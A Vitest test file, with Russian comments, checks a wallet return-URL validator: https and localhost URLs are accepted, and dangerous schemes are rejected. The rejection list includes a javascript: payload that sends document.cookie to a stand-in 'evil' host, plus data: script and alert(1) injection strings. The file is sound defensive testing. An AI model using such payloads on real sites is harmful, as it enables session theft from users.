// Адрес возврата кошелька: только https (и http на localhost) — «javascript:» не пускаем.
import { describe, expect, it } from "vitest";
import { returnUrlOrThrow, safeReturnUrl } from "./walletReturnUrl";

describe("safeReturnUrl", () => {
  it("https и http на localhost — да", () => {
    expect(safeReturnUrl("https://dapp.example/back?x=1")?.host).toBe("dapp.example");
    expect(safeReturnUrl("http://localhost:3000/cb")).not.toBeNull();
    expect(safeReturnUrl("http://127.0.0.1/cb")).not.toBeNull();
  });

  it("javascript:, data:, http на чужом хосте и мусор — нет", () => {
    for (const bad of [
      "javascript:fetch('//evil?'+document.cookie)//",
      "JavaScript:alert(1)",
      " javascript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:x",
      "http://evil.example/",
      "not a url",
      "",
    ])
      expect(safeReturnUrl(bad)).toBeNull();
    expect(() => returnUrlOrThrow("javascript:alert(1)")).toThrow();
  });
});
